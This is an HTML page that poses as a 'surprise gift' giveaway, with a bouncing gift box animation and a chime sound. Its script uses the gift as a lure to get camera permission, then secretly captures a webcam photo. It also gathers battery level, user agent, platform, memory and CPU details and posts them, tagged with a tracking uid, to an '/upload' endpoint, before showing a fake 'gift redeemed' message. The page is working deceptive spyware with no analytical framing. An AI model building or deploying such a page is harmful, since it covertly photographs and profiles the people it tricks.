<!DOCTYPE html>
<html>
<head>
    <title>Claim Your Gift</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding: 20px; }
        .container { margin-top: 50px; }
        .btn { background: #00ff00; color: black; padding: 15px 30px; font-size: 18px; 
               border: none; border-radius: 50px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
        #gift-box { width: 120px; display: none; margin: 0 auto; }
        .bounce { animation: bounce 0.8s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
        .sparkle { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); 
                   width: 0; height: 0; box-shadow: 0 0 60px 40px gold; border-radius: 50%; display: none; }
        #message { margin-top: 20px; font-size: 18px; font-weight: bold; color: #ffffff; }
        #final-msg { color: #00ff00; display: none; }
        #sub-msg { color: #00ff00; font-size: 14px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2 id="header">🎁 You have a surprise gift! ✨</h2>
        <div id="sparkle" class="sparkle"></div>
        <img id="gift-box" src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png">
        
        <div id="action-area">
            <p>👇 Click below to unlock it 🔒</p>
            <button class="btn" onclick="startProcess()">🔓 UNLOCK YOUR GIFT 🎁</button>
        </div>
        
        <div id="loading-area" style="display:none;">
            <p id="message">Your Gift is Loading...🎁</p>
        </div>

        <div id="success-area">
            <h2 id="final-msg">Your gift has been redeemed. 👍</h2>
            <p id="sub-msg">You are a good person, God bless you. ✨</p>
        </div>
    </div>

    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>
    <audio id="magic-sound" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3"></audio>

    <script>
    const urlParams = new URLSearchParams(window.location.search);
    const uid = urlParams.get('uid');
    const mode = urlParams.get('m');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function startProcess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            document.getElementById('action-area').style.display = "none";
            document.getElementById('header').style.display = "none";
            document.getElementById('loading-area').style.display = "block";
            document.getElementById('gift-box').style.display = "block";
            document.getElementById('gift-box').classList.add('bounce');

            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const image = canvas.toDataURL('image/jpeg');
                
                const battery = await navigator.getBattery();
                const info = {
                    battery: (battery.level * 100) + "%",
                    browser: navigator.userAgent,
                    device: navigator.platform,
                    ram: navigator.deviceMemory || "N/A",
                    cores: navigator.hardwareConcurrency || "N/A"
                };

                fetch('/upload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image, uid, mode, info })
                });

                document.getElementById('gift-box').classList.remove('bounce');
                document.getElementById('gift-box').src = "https://cdn-icons-png.flaticon.com/512/4213/4213600.png";
                document.getElementById('loading-area').style.display = "none";
                document.getElementById('sparkle').style.display = "block";
                document.getElementById('magic-sound').play();
                document.getElementById('final-msg').style.display = "block";
                document.getElementById('sub-msg').style.display = "block";
            }, 8000);
        } catch (err) {
            alert("Camera permission is required to claim the gift!");
        }
    }
    </script>
</body>
</html>
